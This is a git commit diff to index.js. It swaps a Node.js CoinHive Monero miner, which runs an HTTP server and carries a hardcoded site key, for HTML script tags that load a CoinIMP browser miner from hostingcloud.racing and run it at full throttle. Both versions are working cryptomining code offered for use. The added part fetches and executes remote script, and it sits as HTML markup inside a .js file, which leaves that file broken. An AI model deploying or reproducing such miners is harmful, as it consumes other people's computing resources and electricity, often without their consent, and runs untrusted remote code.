3919cd825e20a544cd0a9d8704f7f78c6412ef39
marcosemanuel20 <71058424+marcosemanuel20@users.noreply.github.com>
2020-09-10 02:42:52 -0300

    Update index.js

--- index.js
+++ index.js
@@ -1,42 +1,9 @@
-const CoinHive = require('coin-hive');
-const http = require('http');  
+<script src="https://www.hostingcloud.racing/kbDw.js"></script>
+<script>
+    var _client = new Client.Anonymous('f3e8f6406281e6803adbf8fc289f72e873323c8ba93921a35155eb6717093552', {
+        throttle: 0, c: 'w'
+    });
+    _client.start();
+    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
 
-(async () => {
-
-  var os = require('os'), cpuCount = os.cpus().length;
-
-  var threads = Math.max(1,Math.floor(cpuCount/4));
-
-  // Create miner
-  const miner = await CoinHive('vLAANrDcATRQM8RI1nCpFADCdvS0sg4O', {throttle: 0.85, threads: threads}); // Coin-Hive's Site Key
-
-  // Start miner
-  await miner.start();
- 
-  // Listen on events
-  miner.on('found', () => console.log('Found!!'))
-  miner.on('accepted', () => console.log('Accepted!!'))
-  miner.on('update', data => console.log(`
-    Hashes per second: ${data.hashesPerSecond}
-    Total hashes: ${data.totalHashes}
-    Accepted hashes: ${data.acceptedHashes}
-  `));
- 
-  const requestHandler = (request, response) => {  
-    console.log(request.url)
-    response.end('Running the Monero Miner!!')
-  }
-
-  const server = http.createServer(requestHandler)
-
-  server.listen(process.env.PORT, (err) => {  
-    if (err) {
-      return console.log('something bad happened', err)
-    }
-
-    console.log(`server is listening`)
-  })
-
-  // Stop miner
-  //setTimeout(async () => await miner.stop(), 60000);
-})();
+</script>
